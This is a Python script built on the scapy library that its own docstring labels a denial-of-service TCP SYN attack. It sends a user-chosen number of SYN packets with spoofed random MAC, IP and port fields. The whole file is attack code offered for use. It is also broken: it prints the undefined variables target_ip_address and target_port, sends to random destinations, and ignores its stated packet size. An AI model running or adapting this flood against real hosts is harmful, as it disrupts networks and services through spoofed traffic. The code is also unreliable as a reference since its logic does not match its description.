from scapy.layers.inet import Ether, IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import send, sendp
from scapy.volatile import RandShort, RandIP, RandMAC


"""
DOS TCP SYN attack script.
Sending packets with randomized IP/MAC addresses and port numbers.
Number of packets to send can be chosen using CLI.
Byte size of packets can be configured
Sending performance dependent on machine specs.
"""

def send_syn(number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    """
    Function to start DOS TCP SYN attack.
    Payload default is "X" as byte.
    """
    ether = Ether(src=RandMAC(), dst=RandMAC())
    ip = IP(src=RandIP(), dst=RandIP())
    tcp = TCP(sport=RandShort(), dport=RandShort(), flags="S")
    raw = Raw(b"X" * size_of_packet)
    p = ether / ip / tcp /raw
    # p.show()
    sendp(p, count=number_of_packets_to_send, verbose=0)
    print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))

"""
Get number of packets to send from CLI and call send_syn function.
"""

print('Enter number_of_packets_to_send:')
x = input()
send_syn(number_of_packets_to_send=int(x), size_of_packet=1)
